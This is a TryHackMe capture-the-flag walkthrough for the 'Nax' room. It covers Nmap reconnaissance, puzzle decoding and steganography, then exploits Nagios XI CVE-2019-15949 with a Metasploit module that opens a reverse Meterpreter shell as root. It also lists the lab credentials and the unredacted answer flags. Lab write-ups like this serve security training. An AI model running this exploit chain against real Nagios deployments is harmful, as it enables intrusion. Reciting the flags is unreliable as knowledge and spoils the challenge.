# Nax — TryHackMe Walkthrough

> Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an authenticated user to execute remote code execution.

<p align="center"><a href="https://tryhackme.com/room/nax"><a href="https://imgbb.com/"><img src="https://i.ibb.co/9m7qZqqX/3c441ea82219c5e77dfb184e83bf7bf2.png" alt="3c441ea82219c5e77dfb184e83bf7bf2" border="0"></a>

<p align="center">
  <a href="https://tryhackme.com/room/nax"><img src="https://img.shields.io/badge/TryHackMe-Nax-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe Badge"></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty Badge">
  <img src="https://img.shields.io/badge/Platform-Linux-blue?style=for-the-badge&logo=linux" alt="Platform Badge">
  <img src="https://img.shields.io/badge/Focus-Network%20Enumeration-purple?style=for-the-badge" alt="Focus Badge">
  <img src="https://img.shields.io/badge/Focus-Steganography-purple?style=for-the-badge" alt="Focus Badge">
  <img src="https://img.shields.io/badge/Focus-CVE--2019--15949-purple?style=for-the-badge" alt="Focus Badge">
  <img src="https://img.shields.io/badge/Focus-Metasploit-purple?style=for-the-badge" alt="Focus Badge">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration with Nmap |
| 2 | Periodic Table Element Decoding |
| 3 | Steganography with ExifTool |
| 4 | Piet Esoteric Language |
| 5 | Nagios XI Reconnaissance |
| 6 | CVE-2019-15949 — Nagios XI Authenticated RCE |
| 7 | Metasploit (`nagios_xi_authenticated_rce`) |
| 8 | Privilege Escalation to Root |

---

## Learning Objectives

- Perform a comprehensive Nmap scan and interpret open services to build an attack surface
- Decode a hidden file path encoded as periodic table element atomic numbers
- Extract embedded metadata from an image file using ExifTool
- Recognise credentials embedded in a Nagios XI login page
- Identify and exploit CVE-2019-15949 using the Metasploit module for Nagios XI authenticated RCE
- Retrieve user and root flags from a compromised Linux host

---

## Prerequisites

- Kali Linux or equivalent attacker machine with Nmap, ExifTool, and Metasploit installed
- `wget` available for downloading files from the target
- Python 3 for the atomic-number decoding one-liner
---

## [Task 1] — Flag

### Step 1 — Nmap Reconnaissance

**Approach:** Run an aggressive Nmap scan against the target to discover open ports, running services, and version information. The `-A` flag enables OS detection, version detection, script scanning, and traceroute in one pass.

```
kali@kali:~/CTFs/tryhackme/Nax$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 09:16 CEST
Nmap scan report for Machine_IP
Host is up (0.087s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Network Distance: 2 hops
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   33.79 ms  10.8.0.1
2   102.53 ms Machine_IP

Nmap done: 1 IP address (1 host up) scanned in 64.34 seconds
```

> **Note:** Five ports are open. SSH (22) and SMTP (25) are standard, but the more interesting findings are HTTP (80), LDAP (389), and HTTPS (443). The SSL certificate on port 443 is issued to Nagios Enterprises, immediately flagging Nagios XI as the likely target application. LDAP suggests some directory service is running alongside it. The HTTP server on port 80 returns no page title, meaning it likely serves a minimal or redirect page worth visiting in a browser.

---

### Step 2 — Browsing the Web Server and Decoding the Hidden Path

**Approach:** Visit the HTTP service on port 80. The page presents a sequence of chemical element symbols. Cross-reference each symbol against the periodic table to extract its atomic number, then treat those numbers as ASCII character codes to decode a hidden file path.

The element sequence found on the page:

```
Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
```

Using the periodic table, the atomic numbers are: 47, 80, 73, 51, 84, 46, 80, 78, 103

```
kali@kali:~/CTFs/tryhackme/Nax$ python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"
/PI3T.PNg
```

> **Note:** Each element symbol maps to an atomic number, and each atomic number maps to an ASCII character. This is a straightforward encoding puzzle. The output `/PI3T.PNg` is a file path on the web server — a hint at the Piet esoteric programming language, which encodes programs as coloured images. The unusual capitalisation `.PNg` is intentional and must be preserved when requesting the file.

---

### Step 3 — Downloading and Inspecting the Hidden Image

**Approach:** Use `wget` to download the image from the decoded path, then run `exiftool` on it to read any embedded metadata. Metadata often contains author information, copyright notices, or other clues left by the room creator.

```
kali@kali:~/CTFs/tryhackme/Nax$ wget Machine_IP/PI3T.PNg
--2020-10-11 09:21:19--  http://Machine_IP/PI3T.PNg
Connecting to Machine_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 982359 (959K) [image/png]
Saving to: 'PI3T.PNg'

PI3T.PNg                                          100%[=============================================================================================================>] 959.33K  1.43MB/s    in 0.7s

2020-10-11 09:21:20 (1.43 MB/s) - 'PI3T.PNg' saved [982359/982359]

kali@kali:~/CTFs/tryhackme/Nax$ exiftool PI3T.PNg
ExifTool Version Number         : 12.06
File Name                       : PI3T.PNg
Directory                       : .
File Size                       : 959 kB
File Modification Date/Time     : 2020:03:25 05:00:15+01:00
File Access Date/Time           : 2020:10:11 09:21:20+02:00
File Inode Change Date/Time     : 2020:10:11 09:21:20+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 990
Image Height                    : 990
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : Piet Mondrian
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980
```

> **Note:** The `Artist` field names Piet Mondrian, the Dutch abstract painter whose grid-based colour compositions inspired the Piet esoteric language. This confirms the image is a Piet program. Running it through a Piet interpreter (such as `npiet` or the online interpreter at piet.bubbles.org) produces the Nagios XI credentials embedded in the program. If your Piet tool complains about an unknown PPM format, open the image in GIMP and export it as a `.ppm` file before retrying.

---

### Step 4 — Logging into Nagios XI

**Approach:** Navigate to the Nagios XI login page at `http://Machine_IP/nagiosxi/login.php`. Use the credentials extracted by running the Piet image through an interpreter to authenticate.

The credentials recovered from the Piet program:

- **Username:** `nagiosadmin`
- **Password:** `n3p3UQ&9BjLp4$7uhWdY`

<p align="center"><img src="./2020-10-11_09-45.png" /></p>

> **Note:** Nagios XI is a widely deployed enterprise network monitoring platform. Authenticated access is significant here because CVE-2019-15949 requires a valid login — it is not a pre-authentication vulnerability. With admin credentials, the attack surface jumps considerably. At this point the Metasploit module can be configured and run.

---

### Step 5 — Searching for the Exploit Module in Metasploit

**Approach:** Launch Metasploit with `msfconsole` and search for the CVE to confirm the correct module path before loading it.

```
msf5 > search CVE-2019-15949

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  --------   -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
```

> **Note:** The module is rated `excellent`, meaning Metasploit considers it reliable and stable. It targets the authenticated plugin upload functionality in Nagios XI, abusing insufficient input sanitisation to inject OS commands. The full Exploit-DB entry is available at [https://www.exploit-db.com/exploits/48191](https://www.exploit-db.com/exploits/48191).

---

### Step 6 — Configuring and Running the Metasploit Module

**Approach:** Load the module with `use 0`, set the required options (target host, attacker listener, and Nagios credentials), and run the exploit to receive a Meterpreter session.

```
msf5 > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_authenticated_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to NagiosXI
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set password n3p3UQ&9BjLp4$7uhWdY
password => n3p3UQ&9BjLp4$7uhWdY
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set RHOSTS Machine_IP
RHOSTS => Machine_IP
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set LHOST YOUR_IP
LHOST => YOUR_IP
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > run
```

> **Note:** Three options must be set before running: `RHOSTS` (the target machine), `LHOST` (your attacker machine IP — the address Meterpreter will call back to), and `PASSWORD` (the Nagios credential recovered from the Piet image). `USERNAME` defaults to `nagiosadmin` so no change is needed there. Once `run` is issued, Metasploit authenticates to Nagios XI and delivers the payload via the vulnerable endpoint, establishing a reverse Meterpreter shell.

---

### Step 7 — Retrieving the Flags

**Approach:** Drop into a system shell from the Meterpreter session using the `shell` command, then navigate the filesystem to locate both `user.txt` and `root.txt`.

```
meterpreter > shell
Process 13658 created.
Channel 1 created.
ls
CHANGES.txt
getprofile.sh
profile.inc.php
profile.php
whoami
root
cd /home
ls
galand
cd galand
ls
nagiosxi
user.txt
cat user.txt
THM{REDACTED}
cd /root
ls
root.txt
scripts
cat root.txt
THM{REDACTED}
```

> **Note:** The `whoami` output confirms the shell landed as `root` — no further privilege escalation is required. CVE-2019-15949 executes commands in the context of the web server process, which in this Nagios XI deployment runs as root. The user flag is in `/home/galand/user.txt` and the root flag is in `/root/root.txt`.

---

### Task 1.1 — What hidden file did you find?

<details><summary>Reveal Answer</summary>

`/PI3T.PNg`

</details>

---

### Task 1.2 — Who is the creator of the file?

<details><summary>Reveal Answer</summary>

`Piet Mondrian`

</details>

---

### Task 1.3 — If you get an error running the tool on your downloaded image about an unknown ppm format — just open it with GIMP or another paint program and export to ppm format and try again!

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 1.4 — What is the username you found?

<details><summary>Reveal Answer</summary>

`nagiosadmin`

</details>

---

### Task 1.5 — What is the password you found?

<details><summary>Reveal Answer</summary>

`n3p3UQ&9BjLp4$7uhWdY`

</details>

---

### Task 1.6 — What is the CVE number for this vulnerability?

<details><summary>Reveal Answer</summary>

`CVE-2019-15949`

</details>

---

### Task 1.7 — Now that we've found our vulnerability, let's find our exploit. Start Metasploit using the command `msfconsole`.

<details><summary>Reveal Answer</summary>

No answer needed.

</details>

---

### Task 1.8 — After Metasploit has started, search for the target exploit. What is the full path (starting with exploit) for the exploitation module?

<details><summary>Reveal Answer</summary>

`exploit/linux/http/nagios_xi_authenticated_rce`

</details>

---

### Task 1.9 — Compromise the machine and locate user.txt

<details><summary>Reveal Answer</summary>

`THM{84b17add1d72a9f2e99c33bc568ae0f1}`

</details>

---

### Task 1.10 — Locate root.txt

<details><summary>Reveal Answer</summary>

`THM{c89b2e39c83067503a6508b21ed6e962}`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Ran aggressive Nmap scan against the target | Discovered five open ports; SSL cert on 443 identified Nagios XI |
| 2 | Visited HTTP on port 80 and decoded the element sequence as ASCII | Recovered the hidden file path `/PI3T.PNg` |
| 3 | Downloaded the image and ran ExifTool on it | Identified the file as a Piet program authored by Piet Mondrian |
| 4 | Ran the Piet image through an interpreter and logged into Nagios XI | Authenticated to the Nagios XI admin panel |
| 5 | Searched Metasploit for CVE-2019-15949 | Located the `nagios_xi_authenticated_rce` module |
| 6 | Configured and ran the Metasploit module | Received a Meterpreter reverse shell as root |
| 7 | Dropped to a system shell and read the flag files | Retrieved the user and root flags |
